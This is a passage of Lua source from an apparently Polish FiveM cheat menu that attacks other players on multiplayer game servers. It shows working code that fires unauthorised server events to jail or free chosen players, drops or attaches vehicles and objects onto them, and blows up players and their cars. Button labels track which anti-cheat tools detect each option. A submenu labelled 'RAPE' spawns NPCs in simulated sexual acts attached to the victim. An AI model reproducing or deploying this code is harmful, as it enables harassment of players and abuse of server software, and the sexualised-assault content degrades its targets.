                  local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped)+90, true, true)
                else
                  notify("~o~Nie znaleziono pojazdu", true)
                end
              
                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
                TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 45 * 60)
                TriggerServerEvent("esx_jailler:wyslijwiezienie", GetPlayerServerId(SelectedPlayer), 1, "~r~YT: ~w~Patryksu", 1)
                TriggerServerEvent("js:jailuser", GetPlayerServerId(SelectedPlayer), 45 * 60, "~r~YT: ~w~Patryksu")
                TriggerServerEvent("esx-qalle-jail:prisonbreak", GetPlayerServerId(SelectedPlayer), 100, "~r~YT: ~w~Patryksu")
                TriggerServerEvent("esx_jailer:sendToJail23239", GetPlayerServerId(i), 100000, "~r~YT: ~w~Patryksu", 100000)
                TriggerServerEvent("esx_jvamesACailer:sendToJail132", GetPlayerServerId(i), 100000, "~r~YT: ~w~Patryksu", 100000)
                TriggerServerEvent("dreamrpjail:jailPlayerdreamrp", GetPlayerServerId(closestPlayer), jailTime, reason)
                TriggerServerEvent("esx_jailer:sendToJailhype2", GetPlayerServerId(i), 454368438 * 60, "~r~YT: ~w~Patryksu", 54485748)
             
                                TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
                TriggerServerEvent("esx_jailer:wyslijwiezienie", GetPlayerServerId(SelectedPlayer), -1)
                TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(SelectedPlayer), 0)
                TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
                TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))
                TriggerServerEvent('esx-qalle-jail:unJailPlayer', GetPlayerServerId(SelectedPlayer))
                TriggerServerEvent('js:jailuser', GetPlayerServerId(SelectedPlayer), 0, 'escaperino')
              end

              LR.Display()
            elseif LR.IsMenuOpened(Tmas) then
              if LR.MenuButton("~w~Najbardziej kurewskie opcje (RS)                                    >", RAPE) then
              elseif LR.MenuButton("~w~Zresp NPC-ty ~r~[Ryzyko]                                                      ~w~>", SPD) then
              elseif LR.Button("~w~Wyrzuć z pojazdu ~b~[Może nie działać]") then
                ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
              elseif LR.Button("~w~Zresp ciężarówkę ~b~[Może nie działać]") then
                local car = 'mule'
                    local vehicleName = (car)
                    RequestModel(vehicleName)
                    while not HasModelLoaded(vehicleName) do
                        Wait(500) -- often you'll also see Citizen.Wait
                    end
                    local ped = GetPlayerPed(SelectedPlayer)
                    local pos = GetEntityCoords(ped) -- get the position of the local player ped
                    local vehicle = CreateVehicle(vehicleName, pos.x + 5, pos.y, pos.z + 20, GetEntityHeading(ped), true, false)
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    SetPedIntoVehicle(playerPed, vehicle, -1)
                    SetEntityAsNoLongerNeeded(vehicle)
                    SetModelAsNoLongerNeeded(vehicleName)
					elseif LR.Button("~w~Zresp śmieciarkę ~b~[Może nie działać]") then
                    local car = 'trash'
                    local vehicleName = (car)
                    RequestModel(vehicleName)
                    while not HasModelLoaded(vehicleName) do
                        Wait(500) -- often you'll also see Citizen.Wait
                    end
                    local ped = GetPlayerPed(SelectedPlayer)
                    local pos = GetEntityCoords(ped) -- get the position of the local player ped
                    local vehicle = CreateVehicle(vehicleName, pos.x + 5, pos.y, pos.z + 20, GetEntityHeading(ped), true, false)
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    SetPedIntoVehicle(playerPed, vehicle, -1)
                    SetEntityAsNoLongerNeeded(vehicle)
                    SetModelAsNoLongerNeeded(vehicleName)
					elseif LR.Button("~w~Zresp party busa ~b~[Może nie działać]") then
                    local car = 'pbus2'
                    local vehicleName = (car)
                    RequestModel(vehicleName)
                    while not HasModelLoaded(vehicleName) do
                        Wait(500) -- often you'll also see Citizen.Wait
                    end
                    local ped = GetPlayerPed(SelectedPlayer)
                    local pos = GetEntityCoords(ped) -- get the position of the local player ped
                    local vehicle = CreateVehicle(vehicleName, pos.x + 5, pos.y, pos.z + 20, GetEntityHeading(ped), true, false)
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    SetPedIntoVehicle(playerPed, vehicle, -1)
                    SetEntityAsNoLongerNeeded(vehicle)
                    SetModelAsNoLongerNeeded(vehicleName)
					elseif LR.Button("~w~Zresp sterowiec ~r~[Ryzyko]") then
                    local car = 'blimp'
                    local vehicleName = (car)
                    RequestModel(vehicleName)
                    while not HasModelLoaded(vehicleName) do
                        Wait(500) -- often you'll also see Citizen.Wait
                    end
                    local ped = GetPlayerPed(SelectedPlayer)
                    local pos = GetEntityCoords(ped) -- get the position of the local player ped
                    local vehicle = CreateVehicle(vehicleName, pos.x + 5, pos.y, pos.z + 20, GetEntityHeading(ped), true, false)
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    SetPedIntoVehicle(playerPed, vehicle, -1)
                    SetEntityAsNoLongerNeeded(vehicle)
                    SetModelAsNoLongerNeeded(vehicleName)
			    elseif LR.Button("~w~Zresp cysternę ~b~[Może nie działać]") then
                local car = 'tanker'
                    local vehicleName = (car)
                    RequestModel(vehicleName)
                    while not HasModelLoaded(vehicleName) do
                        Wait(500) -- often you'll also see Citizen.Wait
                    end
                    local ped = GetPlayerPed(SelectedPlayer)
                    local pos = GetEntityCoords(ped) -- get the position of the local player ped
                    local vehicle = CreateVehicle(vehicleName, pos.x + 5, pos.y, pos.z + 20, GetEntityHeading(ped), true, false)
                    ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -100.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                    SetPedIntoVehicle(playerPed, vehicle, -1)
                    SetEntityAsNoLongerNeeded(vehicle)
                    SetModelAsNoLongerNeeded(vehicleName)
                  elseif LR.Button("~w~Jednorożec ~b~[Może nie działać]") then
                    selectedPlayerId = SelectedPlayer
                        local ped1 = GetPlayerPed(selectedPlayerId)
                        local oS = GetEntityCoords(ped1)
                        local bH1 = CreateObject(GetHashKey('prop_cs_dildo_01'), oS.x, oS.y, oS.z + 0.6, true, true, true)	
                        NetworkRequestControlOfEntity(bH1)
                        SlideObject (bH1, 0, 0, 9999, 0, 0, 9999, false)
                    elseif LR.Button("~r~Przemaluj pojazd na ~s~różowo") then
                      if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                        NetworkSetInSpectatorMode(false, GetPlayerPed(-1))
                        local ped = GetPlayerPed(-1)
                        local target = GetPlayerPed(SelectedPlayer)
                                  local pos = GetEntityCoords(target)
                                  local vehicle = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                                  local cM = GetEntityCoords(GetPlayerPed(-1))
                                  d4 = false					 
                                  --SetEntityCoords(ped, pos)
                        SetEntityCoords(ped, pos.x, pos.y, pos.z - 4)				 
                        ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                        Citizen.Wait(1000)					 
                                  SetPedIntoVehicle(PlayerPedId(-1), vehicle, -1)
                        Citizen.Wait(4000)
                                  SetVehicleColours(vehicle, 135, 135)					 
                        Citizen.Wait(1000)
                                   SetEntityCoords(ped, cM.x, cM.y, cM.z, 0.0, 0.0, 0.0, false)
                         d4 = true		  
                                 end
              elseif LR.CheckBox("~w~Włącz alarm w ~s~pojeździe", fivem, function(enabled) fivem = enabled end) then
              elseif LR.Button("~w~Zresp tira na głowę ~b~[Może nie działać]") then
                    local vehicleName = 'phantom'
                        
                        -- load the model
                        RequestModel(vehicleName)
                        
                        -- wait for the model to load
                        while not HasModelLoaded(vehicleName) do
                            Wait(500) -- often you'll also see Citizen.Wait
                        end
                        
                        -- get the player's position
                        local playerIdx = GetPlayerFromServerId(429)
                        local ped = GetPlayerPed(SelectedPlayer)
                        local pos = GetEntityCoords(ped) -- get the position of the local player ped
                        
                        -- create the vehicle
                        Citizen.CreateThread(function()
                            local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z, GetEntityHeading(playerPed), true, false)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            -- set the player ped into the vehicle's driver seat
                            SetPedIntoVehicle(playerPed, vehicle, -1)
                            
                            -- give the vehicle back to the game (this'll make the game decide when to despawn the vehicle)
                            SetEntityAsNoLongerNeeded(vehicle)
                            
                            -- release the model
                            SetModelAsNoLongerNeeded(vehicleName)
                        end)
				   elseif LR.Button("~w~Przyczep kosatkę ~r~[Ryzykowne]") then
                    local vehicleName = 'kosatka'
                        
                        -- load the model
                        RequestModel(vehicleName)
                        
                        -- wait for the model to load
                        while not HasModelLoaded(vehicleName) do
                            Wait(500) -- often you'll also see Citizen.Wait
                        end
                        
                        -- get the player's position
                        local playerIdx = GetPlayerFromServerId(429)
                        local ped = GetPlayerPed(SelectedPlayer)
                        local pos = GetEntityCoords(ped) -- get the position of the local player ped
                        
                        -- create the vehicle
                        Citizen.CreateThread(function()
                            local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z, GetEntityHeading(playerPed), true, false)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            -- set the player ped into the vehicle's driver seat
                            SetPedIntoVehicle(playerPed, vehicle, 3)
                            
                            -- give the vehicle back to the game (this'll make the game decide when to despawn the vehicle)
                            SetEntityAsNoLongerNeeded(vehicle)
                            
                            -- release the model
                            SetModelAsNoLongerNeeded(vehicleName)
                        end)
		 elseif LR.Button("~w~Przyczep jacht ~w~do nogi ~r~[fg usuwa electron banuje]") then
	              local hamburg = "sm_boat_lod"
			      local hamburghash = GetHashKey(hamburg)
                  local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)	
elseif LR.Button("~w~Przyczep maze bank do głowy ~r~[fg usuwa electron banuje]") then
    local ped = GetPlayerPed(SelectedPlayer)

    local model = GetHashKey("dt1_11_slod1")
    RequestModel(model)
    while not HasModelLoaded(model) do
        Wait(0)
    end

    local obj = CreateObject(model, 0, 0, 0, true, true, true)
AttachEntityToEntity(
    obj,
    ped,
    GetPedBoneIndex(ped, 31086), -- HEAD
    120.0, 0.0, 0.0,
    0.0, 90.0, 0.0,              -- <<< OBRÓT
    true, true, false, true, 1, true
)

elseif LR.Button("~w~Zresp maze bank na głowie ~r~[fg usuwa]") then
                  local targetPed = GetPlayerPed(SelectedPlayer)
                  if targetPed ~= 0 then
                      local coords = GetEntityCoords(targetPed)
                  
                      local hamburg = "dt1_11_slod1"
                      local hamburghash = GetHashKey(hamburg)
                  
                      RequestModel(hamburghash)
                      while not HasModelLoaded(hamburghash) do
                          Citizen.Wait(0)
                      end
                    
                      local hamburger = CreateObject(
                          hamburghash,
                          coords.x,
                          coords.y,
                          coords.z - 4.0,
                          true,
                          true,
                          true
                      )
                    
                      PlaceObjectOnGroundProperly(hamburger)
                      SetModelAsNoLongerNeeded(hamburghash)
                  end

elseif LR.Button("~w~Przyczep górę chilliad do głowy ~r~[fg usuwa electron banuje]") then
    local ped = GetPlayerPed(SelectedPlayer)

    local model = GetHashKey("cs1_lod3_terrain_slod3_01")
    RequestModel(model)
    while not HasModelLoaded(model) do
      Citizen.Trace("nie załadowano " .. model .. "!")
        Wait(0)
    end

    local obj = CreateObject(model, 0, 0, 0, true, true, true)
AttachEntityToEntity(
    obj,
    ped,
    GetPedBoneIndex(ped, 31086), -- HEAD
    320.0, 0.0, 0.0,
    0.0, 90.0, 0.0,              -- <<< OBRÓT
    true, true, false, true, 1, true
)

elseif LR.Button("~w~Zresp górę chilliad na głowie ~r~[fg usuwa]") then
                  local targetPed = GetPlayerPed(SelectedPlayer)
                  if targetPed ~= 0 then
                      local coords = GetEntityCoords(targetPed)
                  
                      local hamburg = "cs1_lod3_terrain_slod3_01"
                      local hamburghash = GetHashKey(hamburg)
                  
                      RequestModel(hamburghash)
                      while not HasModelLoaded(hamburghash) do
                          Citizen.Wait(0)
                      end
                    
                      local hamburger = CreateObject(
                          hamburghash,
                          coords.x,
                          coords.y,
                          coords.z - 4.0,
                          true,
                          true,
                          true
                      )
                    
                      PlaceObjectOnGroundProperly(hamburger)
                      SetModelAsNoLongerNeeded(hamburghash)
                  end


	     elseif LR.Button("~w~Przyczep UFO ~r~na chuja ~r~[fg usuwa electron banuje]") then
                local hamburg = "imp_prop_ship_01a"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                      elseif LR.Button("~w~Przyczep tira na łeb ~r~[fiveguard = ban]") then
                        local vehicleName = 'pounder'
                            
                            -- load the model
                            RequestModel(vehicleName)
                            
                            -- wait for the model to load
                            while not HasModelLoaded(vehicleName) do
                                Wait(500) -- often you'll also see Citizen.Wait
                            end
                            
                            -- get the player's position
                            local playerIdx = GetPlayerFromServerId(429)
                            local ped = GetPlayerPed(SelectedPlayer)
                            local pos = GetEntityCoords(ped) -- get the position of the local player ped
                            
                            -- create the vehicle
                            Citizen.CreateThread(function()
                                local vehicle = CreateVehicle(vehicleName, pos.x, pos.y, pos.z, GetEntityHeading(playerPed), true, false)
                                AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                                -- set the player ped into the vehicle's driver seat
                                SetPedIntoVehicle(playerPed, vehicle, -1)
                                
                                -- give the vehicle back to the game (this'll make the game decide when to despawn the vehicle)
                                SetEntityAsNoLongerNeeded(vehicle)
                                
                                -- release the model
                                SetModelAsNoLongerNeeded(vehicleName)
                            end)
              	elseif LR.Button("~w~Przyczep pomarańczową kulę ~r~[fg usuwa electron banuje]") then
                local hamburg = "prop_juicestand"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, 0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                elseif LR.Button("~w~Zbuguj gracza ~r~[fg go naprawia electron cię banuje]") then
                local hamburg = "prop_juicestand"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                SetEntityVisible(hamburger, false, 0)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, 0, 0.0, 0.0, 0, true, true, true, true, 1, true)
               elseif LR.Button("~w~Zresp długą tubę ~r~[fg usuwa]") then
                  local targetPed = GetPlayerPed(SelectedPlayer)
                  if targetPed ~= 0 then
                      local coords = GetEntityCoords(targetPed)
                  
                      local hamburg = "ar_prop_ar_tube_l"
                      local hamburghash = GetHashKey(hamburg)
                  
                      RequestModel(hamburghash)
                      while not HasModelLoaded(hamburghash) do
                          Citizen.Wait(0)
                      end
                    
                      local hamburger = CreateObject(
                          hamburghash,
                          coords.x,
                          coords.y,
                          coords.z - 4.0,
                          true,
                          true,
                          true
                      )
                    
                      PlaceObjectOnGroundProperly(hamburger)
                      SetModelAsNoLongerNeeded(hamburghash)
                  end
                  
                
                elseif LR.Button("~w~Zresp pomarańczową kulę ~r~[fg usuwa]") then
                  local targetPed = GetPlayerPed(SelectedPlayer)
                  if targetPed ~= 0 then
                      local coords = GetEntityCoords(targetPed)
                  
                      local hamburg = "prop_juicestand"
                      local hamburghash = GetHashKey(hamburg)
                  
                      RequestModel(hamburghash)
                      while not HasModelLoaded(hamburghash) do
                          Citizen.Wait(0)
                      end
                    
                      local hamburger = CreateObject(
                          hamburghash,
                          coords.x,
                          coords.y,
                          coords.z - 1.0,
                          true,
                          true,
                          true
                      )
                    
                      PlaceObjectOnGroundProperly(hamburger)
                      SetModelAsNoLongerNeeded(hamburghash)
                  end

              elseif LR.Button("~w~Wysadź pojazd ~r~[Ryzykowne]") then
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                else
                  notify("~w~Gracz nie jest w pojeździe.", false)
                end
              elseif LR.Button("~w~Usuń pojazd") then
                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false)
                  ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
                  SetVehicleHasBeenOwnedByPlayer(veh,false)
                  Citizen.InvokeNative(0xAD738C3085FE7E11, veh, false, true) -- set not as mission entity
                  SetVehicleAsNoLongerNeeded(Citizen.PointerValueIntInitialized(veh))
                  Citizen.InvokeNative(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(veh))
                end
              elseif LR.Button("~w~Wysadź gracza ~r~[Ryzykowne]") then
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
              elseif LR.Button("~w~Przyczep pojazdy na głowę ~r~[Ryzykowne]") then
                local pisello = CreateObject(-1207431159, 0, 0, 0, true, true, true)
                local pisello2 = CreateObject(GetHashKey("cargoplane"), 0, 0, 0, true, true, true)
                local pisello3 = CreateObject(GetHashKey("prop_beach_fire"), 0, 0, 0, true, true, true)
                AttachEntityToEntity(pisello, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                AttachEntityToEntity(pisello2, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                AttachEntityToEntity(pisello3, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, true, true, false, true, 1, true)
                local hamburg = "p_spinning_anus_s"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)             
                local hamburg = "imp_prop_ship_01a"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
                local hamburg = "gr_prop_damship_01a"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
	              local hamburg = "sm_boat_lod"
			      local hamburghash = GetHashKey(hamburg)
                  local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetPlayerPed(SelectedPlayer), GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)		  
                local hamburg = "xs_prop_hamburgher_wl"
                local hamburghash = GetHashKey(hamburg)
                local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
                AttachEntityToEntity(hamburger, GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), false), "chassis"), 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			end

              LR.Display()

            elseif LR.IsMenuOpened(RAPE) then
              if LR.Button("~w~Gwałt meneli [Działa na większości serwerów]") then
                RequestModelSync("a_m_o_acult_01")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, true, true)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = -0.2
                for b=1,3 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                  local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
                  SetEntityAsMissionEntity(rapist, true, true)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, true)
                  count = count - 0.4
                end
              elseif LR.Button("~w~Gwałt księży ~r~[Działa na większości serwerów]") then
                RequestModelSync("cs_priest")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, true, true)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = -0.2
                for b=1,3 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                  local rapist = CreatePed(4, GetHashKey("cs_priest"), x,y,z, 0.0, true, false)
                  SetEntityAsMissionEntity(rapist, true, true)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, true)
                  count = count - 0.4
                end

              elseif LR.Button("~w~Dziwka ~r~[Działa na większości serwerów]") then
                RequestModelSync("a_f_y_topless_01")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, true, true)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = 0.3
                for b=1,1 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                  local rapist = CreatePed(4, GetHashKey("a_f_y_topless_01"), x,y,z, 0.0, true, false)
                  SetEntityAsMissionEntity(rapist, true, true)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, true)
                  count = count + 0.4
                end

              elseif LR.Button("~w~Dziwka 2 ~r~[Działa na większości serwerów]") then
                RequestModelSync("S_F_Y_Stripper_02")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, true, true)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = 0.3
                for b=1,1 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                  local rapist = CreatePed(4, GetHashKey("S_F_Y_Stripper_02"), x,y,z, 0.0, true, false)
                  SetEntityAsMissionEntity(rapist, true, true)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, true)
                  count = count + 0.4
                end
              elseif LR.Button("~w~Ludzka stonoga meneli [Działa na większości serwerów]") then
                RequestModelSync("a_m_o_acult_01")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, true, true)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = -0.2
                for b=1,10 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                  local rapist = CreatePed(4, GetHashKey("a_m_o_acult_01"), x,y,z, 0.0, true, false)
                  SetEntityAsMissionEntity(rapist, true, true)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
                  TaskPlayAnim(GetPlayerPed(SelectedPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetPedKeepTask(rapist)
                  TaskPlayAnim(rapist, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                  SetEntityInvincible(rapist, true)
                  count = count - 0.4
                end
              elseif LR.Button("~w~Ludzka stonoga dziwek ~r~[Działa na większości serwerów]") then
                RequestModelSync("a_f_y_topless_01")
                RequestAnimDict("rcmpaparazzo_2")
                while not HasAnimDictLoaded("rcmpaparazzo_2") do
                  Citizen.Wait(0)
                end

                if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                  local veh = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
                  while not NetworkHasControlOfEntity(veh) do
                    NetworkRequestControlOfEntity(veh)
                    Citizen.Wait(0)
                  end
                  SetEntityAsMissionEntity(veh, true, true)
                  DeleteVehicle(veh)
                  DeleteEntity(veh)
                end
                count = 0.3
                for b=1,10 do
                  local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer), true))
                  local rapist = CreatePed(4, GetHashKey("a_f_y_topless_01"), x,y,z, 0.0, true, false)
                  SetEntityAsMissionEntity(rapist, true, true)
                  AttachEntityToEntity(rapist, GetPlayerPed(SelectedPlayer), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                  ClearPedTasks(GetPlayerPed(SelectedPlayer))
